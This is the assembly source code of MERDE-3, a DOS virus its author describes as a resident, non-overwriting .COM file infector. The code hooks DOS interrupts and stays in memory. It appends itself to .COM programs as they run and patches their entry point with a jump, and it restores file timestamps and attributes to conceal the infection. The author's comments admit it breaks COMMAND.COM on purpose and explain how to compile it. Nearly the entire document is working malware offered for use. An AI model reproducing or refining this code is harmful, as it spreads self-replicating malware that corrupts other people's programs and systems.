;  MERDE-3:   A resident, non-overwriting .Com infector by the loki-nator

;Well, here it is, for what it's worth..  It is really kind of a 
;piece of crap, but it is just a rough draft..
;NOTES:
;  If this gets into Command.Com, it (command) won't work for unknown reasons..
;  I could have fixed it by just checking to make sure the file it is infecting
;  isn't command.com, but I decided that this would be it's harmful side effect
;  and left it...  I will have to fix several things in it, like its memory 
;  handling, etc... It only infects files when they are loaded for EXECUTION!
;  it won't infect .com files loaded by debug via AX=4b03, or al=anything
;  except 00.... Also, it hooks int 71 for its own type of multiplex
;  interrupt to check if the resident portion is already installed..
;  I don't know if that will get me in trouble or not.  This is not very well
;  tested, so it may hand under some circumstances or ill-behaved programs
;  that mess with the memory (like I did)...  Well, I need to add .exe 
;  infection, or I will be just a wanna-be virus writer!
;  At this very moment, I will probably modify it for infection of any function
;  that gives INT 21 a DS:DX pointer to a com file.
;  Oh, yeah- If you compile it, you have to run the included Maker.bat file
;  after you have compiled it (Use Tasm, but I guess anything will work.)

;  Any GOOD virus writers out there will obviously notice how inefficient this
;  is, so if you do, leave me mail with some pointers....

compare_val	equ	900
interrupt	equ	21h
Code_seg	Segment Byte
	Assume DS:Code_seg, CS:Code_seg
	ORG 100h
start:	mov	di,0100h			;di=start
	mov	si,bx
	add	si,offset five_bytes-100h
	mov	cx,5
	rep	movsb
	int	71h
	cmp	ax,9999h
	jne	okay
	mov	ax,0100h
	xor	si,si
	xor	si,di
	xor	cx,cx
	jmp	ax
okay:	mov	di,bx
	sub	di,100h
	xor	ax,ax
	mov	es,ax
	mov	ax,es:[interrupt*4]
	mov	bx,es:[interrupt*4+2]
	mov	[di+int_21_saveo],ax
	mov	[di+int_21_saves],bx
	push	cs
	pop	es
	mov	[di+orig_stackp],sp
	cli
	mov	sp,di
	add	sp,offset my_stack
	sti
	push	ax
	push	bx
	push	cx
	push	dx
	push	bp
	push	ds
	push	es
	push	si
	push	di
	mov	[di+my_stack_save],sp
	cli
	mov	sp,[di+orig_stackp]
	sti					
	int	12h
	mov	bx,cs
	mov	cx,1024
	mul	cx	
	clc
	mov	cx,400h
	sub	ax,cx
	sbb	dx,0000			;dx:ax=where we want this mem to end!
	mov	[di+high_ram],dx
	mov	[di+low_ram],ax
here:	mov	cx,cs
	mov	ax,0010h
	mul	cx
	clc
	mov	cx,di
	add	cx,offset ending
	add	ax,cx
	adc	dx,0000
	clc
	sub	[di+low_ram],ax
	sbb	[di+high_ram],dx
	clc
	mov	ax,[di+low_ram]
	mov	dx,[di+high_ram]
	mov	cx,0010h
	div	cx		;dx:ax=memory above this-divide it by 16
	mov	bx,ax
	mov	ah,4ah
	int	21h
	jnc	okay_1
	jmp	get_out
okay_1:	mov	ah,48h
	mov	bx,60h
	int	21h
	mov	[my_segment+di],ax
	jnc	okay_2
	jmp	get_out
okay_2:	push	di
	xor	di,di
	xor	si,si
	mov	es,ax
	mov	cx,100h
	rep	movsb
	pop	si
	push	si
	add	si,100h
	mov	cx,offset ending-100h
	rep	movsb
	pop	di
	mov	dx,es
	sub	dx,1
	mov	es,dx
	mov	es:[1],ax
	mov	byte ptr es:[0],'Z'
	mov	word ptr es:[3],0000
	mov	es,ax
	mov	es:[16h],ds
	mov	ax,offset return_to_file
	add	ax,di
	mov	es:[0ah],ax
	mov	es:[0ch],ds
	mov	ah,50h
	mov	bx,es
	int	21h
	mov	dx,600h
	mov	ax,es
	mov	ds,ax
	mov	es,ax
	push	cs
	pop	ss
	mov	word ptr cs:[return_to_file+di+1],di
	mov	sp,600h
	int	27h
return_to_file:
	mov	di,0000
	xor	ax,ax
	mov	es,ax
	mov	bx,offset my_21
	mov	ax,cs:[di+my_segment]
	mov	word ptr es:[interrupt*4],bx
	mov	word ptr es:[interrupt*4+2],ax
	mov	word ptr es:[71h*4+2],ax
	mov	bx,offset my_71	
	mov	word ptr es:[71h*4],bx
	mov	ax,cs
	cli
	mov	ss,ax
	mov	sp,cs:[my_stack_save+di]
	sti
	pop	di
	pop	si
	pop	es
	pop	ds
	pop	bp
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	cli
	mov	sp,cs:[di+orig_stackp]
	sti
	mov	ax,0100h
	jmp	ax
get_out:
	mov	ax,cs
	cli
	mov	ss,ax
	mov	sp,cs:[di+my_stack_save]
	sti
	pop	di
	pop	si
	pop	es
	pop	ds
	pop	bp
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	cli
	mov	sp,cs:[di+orig_stackp]
	sti
	mov	ax,0100h
	jmp	ax	


;------------------------------------------------------------------

my_21:	
	cmp	ah,4bh
	je	continue_with_it
	jmp	continue_21
continue_with_it:
	cmp	al,00
	je	okay_go
	jmp	continue_21
okay_go:
	push	ax
	push	bx
	push	cx
	push	dx
	push	es
	push	di
	push	si
	push	bp
	push	es
	push	ds
check_file:
	mov	bx,dx
	xor	si,si
looper:	
	cmp	byte ptr ds:[bx+si],'.'
	je	check_com
	cmp	si,35
	jle	okay5
	jmp	give_up1
okay5:	inc	si
	jmp	looper
check_com:
	inc	si
	cmp	byte ptr ds:[bx+si],'c'
	je	check_for_infection
	cmp	byte ptr ds:[bx+si],'C'
	je	check_for_infection
	jmp	give_up1
check_for_infection:
	mov	cs:[high_file],ds
	mov	cs:[low_file],dx
	mov	ah,50h		;set PSP to ours
	push	cs
	pop	bx
	call	dos_21
	mov	ah,43h
	xor	al,al
	call	dos_21
	jnc	okay9
	jmp	give_up
okay9:	mov	cs:[attrib],cx
	mov	ah,43h
	mov	al,1
	xor	cx,cx
	call	dos_21
	mov	ah,3dh
	mov	al,2
	call	dos_21
	jnc	okay10
	jmp	give_up
okay10:	mov	cs:[handle],ax
	mov	bx,ax
	mov	ah,57h
	xor	al,al
	call	dos_21
	mov	cs:[date],dx
	mov	cs:[time],cx
	mov	al,2
	mov	ah,42h
	xor	dx,dx
	xor	cx,cx
	call	dos_21
	jnc	okay11
	jmp	give_up
okay11:	cmp	dx,0
	je	okay12
	jmp	give_up
okay12:	mov	cs:[file_size],ax
	cmp	ax,64000
	jb	contin1
	call	reset_all
	jmp	give_up
contin1:
	cmp	ax,1024
	jnb	contin2
	call	reset_all
	jmp	give_up
contin2:
	sub	ax,compare_val
	mov	dx,ax
	xor	cx,cx
	mov	ah,42h
	xor	al,al
	mov	bx,cs:[handle]
	call	dos_21
	mov	ah,3fh
	push	cs
	pop	ds
	mov	dx,offset buffer
	mov	cx,2
	call	dos_21
	mov	ax,word ptr cs:[buffer]
	mov	bx,word ptr cs:[offset ending-compare_val]
	cmp	ax,bx
	jne	infect_it
	call	reset_all
	jmp	give_up
infect_it:
	xor	cx,cx
	xor	dx,dx
	mov	bx,cs:[handle]
	mov	ax,4200h
	call	dos_21
	mov	ah,3fh
	mov	cx,5
	push	cs
	pop	ds
	mov	dx,offset five_bytes
	call	dos_21
	mov	ax,4202h
	xor	cx,cx
	xor	dx,dx
	call	dos_21
	mov	ax,cs:[file_size]
	add	ax,100h
	mov	word ptr cs:[jumper+1],ax
	mov	ah,40h
	mov	cx,offset ending-100h
	mov	dx,0100h
	call	dos_21
	xor	cx,cx
	xor	dx,dx
	mov	ax,4200h
	mov	bx,cs:[handle]
	call	dos_21
	mov	dx,offset jumper
	mov	ah,40h
	mov	cx,5
	call	dos_21
	call	reset_all		
give_up:
	mov	ah,50h
	mov	bx,cs:[high_file]
	call	dos_21
give_up1:
	pop	ds
	pop	es
	pop	bp
	pop	si
	pop	di
	pop	es
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	jmp	continue_21
continue_21:
	jmp	dword ptr cs:[int_21_saveo]
dos_21:
	pushf
	call	dword ptr cs:[int_21_saveo]
	ret

reset_all:
	mov	bx,cs:[handle]
	mov	cx,cs:[time]
	mov	dx,cs:[date]
	mov	ax,5701h
	call	dos_21
	mov	ah,3eh
	mov	bx,cs:[handle]
	call	dos_21
	mov	ah,43h
	mov	al,1
	mov	cx,cs:[attrib]
	mov	ds,cs:[high_file]
	mov	dx,cs:[low_file]
	call	dos_21
	ret	
my_71:
	mov	ax,9999h
	iret
dw	44 dup(00)
my_stack:
jumper:		mov	bx,0000
		jmp	bx
file_size	dw	0000
high_file	dw	0000
low_file	dw	0000
handle		dw	0000
attrib		dw	0000
date		dw	0000
time		dw	0000
int_21_saveo	dw	0000
int_21_saves	dw	0000
orig_stackp	dw	0000
my_stack_save	dw	0000
high_ram	dw	0000
low_ram		dw	0000
my_segment	dw	0000
buffer:		db	10 dup(00)
five_bytes:	db	0cdh,20h,90h,90h,90h
my_little_message_to_the_world:

	db	'Scan me, I LIKE IT!!!!-Loki-nator!'
ending:
Code_seg 	ENDS
END	start